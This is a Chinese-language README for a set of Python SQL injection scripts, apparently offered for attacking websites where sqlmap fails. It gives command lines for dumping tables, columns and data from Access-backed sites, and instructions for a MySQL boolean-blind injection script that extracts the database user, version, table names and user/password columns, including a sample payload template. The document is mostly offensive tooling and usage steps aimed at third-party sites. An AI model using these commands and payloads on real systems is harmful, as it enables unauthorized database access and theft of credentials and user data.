# 1.写这些脚本的目的

解决sqlmap不能跑的站点，并且手工注入又会消耗大量的时间和精力的情况。

# 2.用法

## 2.1 ACCESS-Injection

Blog ： http://admintony.com/ACCESS注入之逐字猜解法-Python工具.html
```bash
python3 inj.py -u Url --tables --keyword=true_page_keyword [--thread=20] #爆表名,--thread参数可选，默认为10

python3 inj.py -u Url -T table_name --columns --keyword=true_page_keyword [--thread=20] #爆表名

python3 inj.py -u Url -T table_name -C col_name1,col_name2... --dump --keyword=keyword[--thread=20] #爆数据
```
## 2.2 MYSQL-Bind-injection

Blog ： http://admintony.com/基于布尔盲注的脚本编写实例.html

1>第一处

```python
#Target URL
url = "http://targetURL//index.php?a=index&f=ilist&p="
#keyword 用于判断页面是否正确
keyword ="keyword"
```

将代码开头的URL和keyword修改

**注意：**

keyword 为http://targetURL/index.php?p=-1 or 1=1 和 http://targetURL/index.php?p=-1 or 1=2 页面中只出现在前者页面而不出现在后者页面中的值

URL 中存在注入的参数放到最后，并且不跟参数值，程序会自动加上参数值

2>第二处：需要使用什么功能就把什么功能的代码注释取消即可，至于该改的table_name,column_name自己改一下
```python
    info = Info()
    #注入当前数据库的用户
    #info.user()
    #注入数据库的版本
    #info.version()
    #注入当前数据库的名字
    #info.database()
    #注入表名
    #run()
    #注入列名
    run_column("shi_user")
    #注入数据
    #columnL = ["uid","pwd"]
    #run_value("pw_user",*columnL)```
    
3>爆列中数据的时候，列名请填写两个，在程序写死了，如果需要多个列名请修改第334行代码：

e.g.三个列
```python
payload = "-1 or ascii(substr((select concat(%s,0x7c,%s,0x7c,%s) from %s limit %s,1),%s,1))=%s" \
% (self.column[0],self.column[1],self.column[2],self.table, self.i, x, n)
```
# 3.目录

```html
###########
├── Readme.md               // 帮助文档 
├── ACCESS-Injection        // ACCESS的逐字猜解法脚本
│   ├── injection.py        //主程序
│   ├── table.txt           //常用表名，来自sqlmap
│   ├── column.txt          //常用列名，来自sqlmap
├── MYSQL-Bind-injection    //mysql基于布尔盲注的脚本
│   ├── injection.py        //主程序

```
